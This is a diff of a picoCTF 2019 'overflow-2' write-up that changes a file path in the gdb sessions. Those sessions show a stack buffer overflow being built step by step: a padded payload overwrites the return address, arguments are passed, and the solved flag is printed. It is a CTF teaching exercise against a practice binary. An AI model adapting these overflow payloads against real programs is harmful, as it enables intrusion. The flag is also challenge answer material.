@@ -117,7 +117,7 @@ End of assembler dump.
 (gdb) b* 0x08048695
 Breakpoint 1 at 0x8048695
 (gdb) r < <(python -c 'print("A"*184)')
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*184)')
+Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*184)')
 Please enter your string: 
 
 Breakpoint 1, 0x08048695 in vuln ()
@@ -132,7 +132,7 @@ Stack level 0, frame at 0xffaacbb0:
 (gdb) r < <(python -c 'print("A"*284)')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*284)')
+Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*284)')
 Please enter your string: 
 
 Breakpoint 1, 0x08048695 in vuln ()
@@ -155,7 +155,7 @@ Through a bunch of trial an error I finally found the input that lets us jump to
 (gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
+Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
 Please enter your string: 
 
 Breakpoint 1, 0x08048695 in vuln ()
@@ -245,7 +245,7 @@ Breakpoint 1 at 0x804864a
 (gdb) b* 0x08048653
 Breakpoint 2 at 0x8048653
 (gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
+Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
@@ -259,7 +259,7 @@ Let's append some input into it.
 (gdb) b* 0x080485e6
 Breakpoint 1 at 0x80485e6
 (gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
-Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
+Starting program: /problems/overflow-2/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
 
@@ -277,7 +277,7 @@ Backtrace stopped: previous frame inner to this frame (corrupt stack?)
 So remember the stack grows from the EBP, so our first and second arguments are between `#1-#4`. However, the code seems to be looking at `ebp+8` so let's send `4 A's` before our arguments.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
+samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
